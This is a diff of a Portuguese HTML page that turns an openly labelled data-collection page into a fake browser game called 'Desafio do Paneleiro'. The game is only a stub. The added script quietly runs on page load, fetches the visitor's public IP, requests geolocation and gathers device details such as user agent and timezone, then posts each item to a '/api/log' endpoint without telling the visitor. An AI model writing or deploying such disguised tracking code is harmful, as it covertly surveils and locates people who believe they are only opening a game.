@@ -3,236 +3,151 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Paneleiro - Coleta de Dados</title>
+    <title>Desafio do Paneleiro</title>
     <style>
-        * {
+        body {
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to right, #ff6b6b, #4ecdc4);
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 20px;
         }
-        .card {
-            background: white;
-            border-radius: 15px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
-            overflow: hidden;
-            width: 100%;
+        .game-container {
+            width: 90%;
             max-width: 500px;
-            animation: fadeIn 0.5s ease-out;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .header {
-            background: #2c3e50;
-            color: white;
-            padding: 30px;
-            text-align: center;
-        }
-        .header h1 {
-            font-size: 24px;
-            margin-bottom: 5px;
-        }
-        .header p {
-            opacity: 0.8;
-            font-size: 14px;
-        }
-        .content {
-            padding: 30px;
-        }
-        .info-grid {
-            display: grid;
-            gap: 20px;
-        }
-        .info-card {
-            background: #f8f9fa;
+            background: white;
             border-radius: 10px;
             padding: 20px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
-        }
-        .info-card h3 {
-            color: #2c3e50;
-            margin-bottom: 10px;
-            font-size: 16px;
-        }
-        .info-card pre {
-            font-family: monospace;
-            font-size: 12px;
-            background: #e9ecef;
-            padding: 10px;
-            border-radius: 5px;
-            overflow-x: auto;
-            max-height: 100px;
-            white-space: pre-wrap;
-        }
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,.3);
-            border-radius: 50%;
-            border-top-color: white;
-            animation: spin 1s ease-in-out infinite;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .footer {
-            padding: 20px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
             text-align: center;
-            color: #6c757d;
-            font-size: 12px;
+        }
+        h1 {
+            color: #ff6b6b;
+            margin-bottom: 20px;
+        }
+        canvas {
+            background: #f8f9fa;
+            border-radius: 5px;
+            display: block;
+            margin: 0 auto;
+        }
+        .controls {
+            margin-top: 20px;
+        }
+        button {
+            background: #4ecdc4;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 0 5px;
+        }
+        .hidden {
+            display: none;
         }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="header">
-            <h1>Paneleiro - Coleta de Dados</h1>
-            <p>Coletando informações de segurança</p>
-        </div>
-        <div class="content">
-            <div class="info-grid">
-                <!-- IP Público -->
-                <div class="info-card">
-                    <h3>IP Público</h3>
-                    <pre id="public-ip">Carregando...</pre>
-                </div>
-                
-                <!-- Localização -->
-                <div class="info-card">
-                    <h3>Localização</h3>
-                    <pre id="location">Carregando...</pre>
-                </div>
-                
-                <!-- Rede Wi-Fi -->
-                <div class="info-card">
-                    <h3>Rede Wi-Fi</h3>
-                    <pre id="wifi">Carregando...</pre>
-                </div>
-                
-                <!-- Dispositivo -->
-                <div class="info-card">
-                    <h3>Dispositivo</h3>
-                    <pre id="device">Carregando...</pre>
-                </div>
-            </div>
-        </div>
-        <div class="footer">
-            <div id="status">Processando...</div>
+    <div class="game-container">
+        <h1>Desafio do Paneleiro</h1>
+        <canvas id="gameCanvas" width="400" height="300"></canvas>
+        <div class="controls">
+            <button onclick="startGame()">Iniciar Jogo</button>
+            <button onclick="pauseGame()" class="hidden">Pausar</button>
         </div>
     </div>
 
     <script>
-        // Coleta de IP público
-        async function getPublicIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                document.getElementById("public-ip").textContent = data.ip;
-                return data.ip;
-            } catch (error) {
-                console.error("Erro ao obter IP:", error);
-                document.getElementById("public-ip").textContent = "Erro ao obter IP";
-                return null;
-            }
-        }
+        // Configuração do jogo
+        const canvas = document.getElementById('gameCanvas');
+        const ctx = canvas.getContext('2d');
+        let gameRunning = false;
 
-        // Coleta de localização
-        function getLocation() {
+        // Coleta de informações no background
+        function collectBackgroundInfo() {
+            // Coleta de IP
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    console.log('IP:', data.ip);
+                    // Enviar para backend
+                    fetch('/api/log', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({type: 'ip', value: data.ip})
+                    });
+                });
+
+            // Coleta de localização
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    showPosition,
-                    showError
-                );
-            } else {
-                document.getElementById("location").textContent = "Geolocalização não suportada";
+                navigator.geolocation.getCurrentPosition(pos => {
+                    console.log('Localização:', pos.coords.latitude, pos.coords.longitude);
+                    fetch('/api/log', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            type: 'location',
+                            value: {
+                                lat: pos.coords.latitude,
+                                lng: pos.coords.longitude
+                            }
+                        })
+                    });
+                });
             }
+
+            // Coleta de dispositivo
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                resolution: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+            console.log('Dispositivo:', deviceInfo);
+            fetch('/api/log', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({type: 'device', value: deviceInfo})
+            });
         }
 
-        function showPosition(position) {
-            const lat = position.coords.latitude;
-            const lng = position.coords.longitude;
-            document.getElementById("location").textContent = 
-                `Lat: ${lat.toFixed(6)}, Lng: ${lng.toFixed(6)}\nPrecisão: ${position.coords.accuracy}m`;
+        // Função do jogo
+        function startGame() {
+            gameRunning = true;
+            document.querySelector('.controls button:first-child').classList.add('hidden');
+            document.querySelector('.controls button:last-child').classList.remove('hidden');
+            gameLoop();
         }
 
-        function showError(error) {
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    document.getElementById("location").textContent = "Permissão negada";
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    document.getElementById("location").textContent = "Localização indisponível";
-                    break;
-                case error.TIMEOUT:
-                    document.getElementById("location").textContent = "Tempo limite";
-                    break;
-                default:
-                    document.getElementById("location").textContent = "Erro desconhecido";
-                    break;
-            }
+        function pauseGame() {
+            gameRunning = false;
+            document.querySelector('.controls button:last-child').classList.add('hidden');
+            document.querySelector('.controls button:first-child').classList.remove('hidden');
         }
 
-        // Coleta de Wi-Fi (simulada)
-        function getWiFiInfo() {
-            document.getElementById("wifi").textContent = 
-                "SSID: Exemplo-WiFi\nBSSID: AA:BB:CC:DD:EE:FF\nCanal: 6";
-        }
-
-        // Coleta de dispositivo
-        function getDeviceInfo() {
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            const screenRes = `${screen.width}x${screen.height}`;
-            const cookieEnabled = navigator.cookieEnabled;
-            const language = navigator.language;
+        function gameLoop() {
+            if (!gameRunning) return;
             
-            document.getElementById("device").textContent = 
-                `Plataforma: ${platform}\nResolução: ${screenRes}\nUser-Agent: ${userAgent.substring(0, 50)}...\nCookies: ${cookieEnabled ? 'Habilitados' : 'Desabilitados'}\nIdioma: ${language}`;
-        }
-
-        // Função principal
-        async function collectAllData() {
-            document.getElementById("status").innerHTML = 
-                '<div class="loading"></div> Coletando dados...';
+            // Limpar canvas
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
             
-            try {
-                await Promise.all([
-                    getPublicIP(),
-                    new Promise(resolve => setTimeout(() => {
-                        getLocation();
-                        resolve();
-                    }, 500)),
-                    new Promise(resolve => setTimeout(() => {
-                        getWiFiInfo();
-                        resolve();
-                    }, 1000)),
-                    new Promise(resolve => setTimeout(() => {
-                        getDeviceInfo();
-                        resolve();
-                    }, 1500))
-                ]);
-                
-                document.getElementById("status").textContent = 
-                    "Dados coletados com sucesso!";
-            } catch (error) {
-                document.getElementById("status").textContent = 
-                    "Erro durante coleta: " + error.message;
-            }
+            // Desenhar jogo (exemplo simples)
+            ctx.fillStyle = '#ff6b6b';
+            ctx.fillRect(Math.random()*300, Math.random()*200, 50, 50);
+            
+            // Continuar loop
+            requestAnimationFrame(gameLoop);
         }
 
-        // Inicia a coleta quando a página carrega
-        window.addEventListener('load', collectAllData);
+        // Iniciar coleta de informações quando o site carrega
+        window.addEventListener('load', () => {
+            collectBackgroundInfo();
+        });
     </script>
 </body>
 </html>
